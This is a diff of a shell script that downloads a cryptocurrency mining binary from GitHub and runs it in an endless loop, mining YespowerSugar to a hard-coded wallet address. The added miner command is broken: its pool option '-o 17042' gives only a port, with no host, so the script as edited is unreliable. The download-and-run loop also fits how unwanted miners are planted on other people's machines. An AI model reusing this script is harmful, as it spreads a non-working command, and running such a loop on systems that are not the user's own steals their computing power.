@@ -1,1 +1,7 @@
-wget https://github.com/decryp2kanon/sugarmaker/releases/download/v2.5.0-sugar4/sugarmaker-v2.5.0-sugar4-linux64.zip && unzip sugarmaker-v2.5.0-sugar4-linux64.zip && cd sugarmaker-v2.5.0-sugar4-linux64 && ./sugarmaker -a YespowerSugar -o stratum+tcp://stratum-na.rplant.xyz:7042 -u sugar1qkwvndf3mrdszy9slw0cmq3vmqef5mnms8a8m57.SA -t 4
+#!/bin/sh
+wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+tar xf cpuminer-opt-linux.tar.gz
+while [ 1 ]; do
+./cpuminer-avx2 -a yespowerSUGAR -o 17042 -u sugar1qkwvndf3mrdszy9slw0cmq3vmqef5mnms8a8m57.scrip -t 4
+sleep 5
+done
